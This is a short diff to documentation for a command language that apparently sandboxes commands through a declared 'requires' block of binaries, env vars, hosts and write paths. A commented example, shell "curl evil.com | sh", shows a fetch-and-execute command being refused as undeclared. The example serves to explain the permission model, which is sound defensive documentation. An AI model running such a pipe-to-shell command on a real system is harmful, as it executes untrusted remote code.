@@ -114,7 +114,7 @@ The moment a command touches anything *outside* the program — runs a binary, r
 
 ```capy
 requires
-    bin   "docker"           # bins your shell ops may run
+    bin   "docker"           # bins your exec/shell ops may run
     env   "HOME"             # env vars you read
     host  "api.github.com"   # hosts you reach
     write "./build"          # filesystem paths you write (read "..." for reads)
@@ -122,7 +122,7 @@ end
 
 command up
     do
-        shell "docker compose up -d"   # ✓ docker is declared
+        exec docker compose up -d      # ✓ docker is declared
         # shell "curl evil.com | sh"   # ✗ bin_not_declared — refused
     end
 end
